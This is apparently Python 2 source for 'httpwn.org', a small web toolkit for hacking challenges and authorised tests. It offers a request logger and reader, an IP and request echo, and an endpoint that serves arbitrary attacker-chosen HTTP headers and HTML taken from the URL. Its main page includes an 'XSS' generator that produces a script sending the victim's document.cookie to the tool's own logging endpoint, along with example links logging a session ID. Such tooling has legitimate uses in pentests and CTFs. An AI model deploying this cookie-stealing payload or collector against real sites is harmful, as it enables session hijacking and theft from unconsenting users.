#httpwn.org
#Copyright (C) 2016  Bram Staps
#
#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU Affero General Public License as
#published by the Free Software Foundation, either version 3 of the
#License, or (at your option) any later version.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU Affero General Public License for more details.
#
#You should have received a copy of the GNU Affero General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.

def _sites(sites, ALL, GET, POST, compile):
    sites.append((GET, compile("^/style.css$"), ALL, css))
    sites.append((GET, compile("^/logrequest(\\?.*)?$"), ALL, log_request))
    sites.append((GET, compile("^/myrequest(/.*)?$"), ALL, feedback_url))
    sites.append((GET, compile("^/htmldisplay/"), ALL, htmldisplay))
    sites.append((GET, compile("^/readrequest$"), ALL, requestlog))
    sites.append((ALL, compile("^/myip$"), ALL, my_ip))
    sites.append((GET, compile("^/$"), ALL, mainsite))

from site_constructs import *
from settings import settings


def my_ip(method, url, version, headers, lines):
    print "Connection: close"
    print "Content-Type: text/plain" 
    print ""
    print get_ip() 

def feedback_url(method, url, version, headers, lines):
    print "Connection: close"
    print "Content-Type: text/plain" 
    print ""
    print "%s:%s\n" %(get_ip(),get_port())
    print "\n".join(lines)

def log_request(method, url, version, headers, lines):
    lines = ["---------- %s:%s @ %f ----------" % (get_ip(), get_port(), time())] + lines + ["-----------------------------------------------------"]
    raw_text = "\n".join(lines).strip()
    with open(settings["requestlogpath"], "a") as f:
        f.write("%s\n" % raw_text)
    print "HTTP/1.1 200 OK"
    print "Connection: close"

def requestlog(method, url, version, headers, lines):
    with open(settings["requestlogpath"], "r+") as f:
        data = f.read()
    
    print "Connection: close"
    print "Content-Type: text/plain"
    print ""
    print data


def htmldisplay(method, url, version, headers, lines):
    data = url[len("/htmldisplay/"):]
    un_data = unquote(data)
    print un_data

#style sheet
def css(method, url, version, headers, lines):
    print "Connection: close"
    print "Content-Type: text/css"
    print """
/* I have no style */
*
{
    font-family: monospace;
    font-color: #0F0;
    font-size: 12pt;
    color: #0F0;
    background-color:black;
}
div
{
    border: 1px solid #0F0;
}

input
{
    border: 1px solid #0F0;
}

textarea
{
    border: 1px solid #0F0;
}

a:hover
{
    text-decoration: underline;
}

a
{
    text-decoration: none;
}
.noborder
{
    border: none; 
}
.red
{
    border-color: #F00;
    font-color: #F00;
    color: #F00;
}
.red a
{
    border-color: #F00;
    font-color: #F00;
    color: #F00;
}
"""

def mainsite(method, url, version, headers, lines):
    html_headers()
    print """
<html>
<head>
<title>Htt(p)wnage tool</title>
<link href="style.css" rel="stylesheet" type="text/css">
<script>

function hide(obj)
{
    document.getElementById(obj).style.display = 'none';
}

function show(obj)
{
    document.getElementById(obj).style.display = 'block';
}

function clearDiv()
{
    document.getElementById('tip').innerHTML = '';
}

function setTip(tip, select=false)
{
    div = document.getElementById('tip');
    div.innerHTML = tip;

    if (select)
    {
        if (document.body.createTextRange)
        {
            range = document.body.createTextRange();
            range.moveToElementText(div);
            range.select();
        } 
        else if (window.getSelection) 
        {
            selection = window.getSelection();        
            range = document.createRange();
            range.selectNodeContents(div);
            selection.removeAllRanges();
            selection.addRange(range);
        }
    }
}

function hideAll()
{
    divsToHide = new Array("htmldisplaytool");
    for (i in divsToHide)
    {
        hide(divsToHide[i]);
    }
}
</script>
</head>
<body style="min-width:1000px">

<div class="noborder" id="warning">
Hello there, this site contains a nice slection of tools for hacking purposes. 
<b>By using this site you agree you will only use these tools for hacking challenges and / or other test where you have explicit permission from the owner to perform them.</b>
The red part are links for targets, so if you dont intend to be one don't click them.
The green part are tools you can use. <input type="button" value="Hide" onclick="hide('warning'); document.cookie='hide=1;'" />
</div>


<div style="text-align:center"><font style="font-size:500%">""" + settings["servername"] + """</font></div>
<br>

<div id="htmldisplaytool" style="display:none; padding:10px;">

    <input type="text" value="HTTP/1.1 200 OK" style="width:100%;" readonly="readonly">

<textarea style="width:100%;height:75px" id="headers">
Connection: close
Content-Type: text/html
</textarea> 

    <br>

<textarea style="width:100%;height:200px" id="content">
<html>
    <head>
        <script>
            alert("Hello, welcome to """ + settings["servername"] + """");
        </script>
    </head>
    <body />
</html>
</textarea>
    <script>
        function apply()
        {
            setTip( '""" + proto_name() + """' + '://' + '""" + settings["servername"] + """' + '/htmldisplay/' + encodeURIComponent( document.getElementById("headers").value) + "%0A" + encodeURIComponent(document.getElementById("content").value), true );
        }
    </script>
    <input type="button" value="Generate" onclick="apply();" />  <input type="button" value="Hide" onclick="hideAll();"/>

</div>

<div id="tip" style="height:100pt;">
</div>

<br>

<script>
    cookies = document.cookie.split(";");
    for (i in cookies)
    {
        if (cookies[i].trim() === "hide=1") document.getElementById('warning').style.display = "none";
    }
</script>

<table style="width:100%;margin-left:auto;margin-right:auto;table-layout:fixed;">
    <tr>
        <td valign="top">
            <div style="padding:5px;margin-right:10px">
                <div class="noborder" style="text-align:center;">
                    <b><font>Server-side readout</font></b>
                </div>
                <br>
                <div class="noborder" style="text-align:right">
                    <a href="/myip" onmouseout="clearDiv()" onmouseover="setTip('You can use this link (in an automated way) to determine your WAN IP. all http methods are supported (GET/POST/etc).')">My IP</a><br>
                    <a href="/myrequest" onmouseout="clearDiv()" onmouseover="setTip('Check what kind of request your browser is sending to this site, including headers and http-method.')">My request</a><br>
                    <a href="/readrequest" onmouseout="clearDiv()" onmouseover="setTip('Read all requsts made by the request logger')">Read logged requests</a><br>
                    <br>
                </div>    
            </div>
        </td>
        <td valign="top">
            <div class="red" style="padding:5px;margin-left:10px;margin-right:10px;">
                <div class="noborder" style="text-align:center;">
                    <b><font class="red">Exploitation url examples</font></b>
                </div>
                <br>
                <div class="red noborder"" style="text-align:center;">
                    <br>
                    <br>
                    <a href="/logrequest?q=SESSIONID%3Dsecret" onmouseout="clearDiv()" onmouseover="setTip('Nice logging facility that logs all requests being made')">Log requests</a><br>
                    <a href="/htmldisplay/Connection%3A%20close%0AContent-Type%3A%20text%2Fplain%0A%0Aplain%20text%20example" onmouseout="clearDiv()" onmouseover="setTip('Serve a page of your chosing, inlcuding customisable HTTP headers (This example displays some text)')">Html diplay</a><br>
                </div>
            </div>
        </td>
        <td valign="top">
            <div style="padding:5px;margin-left:10px">
                <div class="noborder" style="text-align:center;">
                    <b><font>Convenient generators</font></b>
                </div>
                <br>
                <div class="noborder" style="text-align:left;">
                    <br>
                    <br>
                    <script>
                        function xssTip()
                        {
                            setTip('&ltscript&gt<br>var i = new Image();<br>i.src = \"""" + proto_name() + "://" + settings["servername"] + """/logrequest?q=\" + escape(document.cookie);<br>&lt/script&gt', true);
                        }
                    </script>
                    <a href="#" onclick="hideAll();xssTip();">Generate code to XSS<br>
                    <a href="#" onclick="hideAll();show('htmldisplaytool');">Generate Html display url<br>
                </div>                
            </div>
        </td>
    </tr>
</table>
<br>

"""
    epilogue()
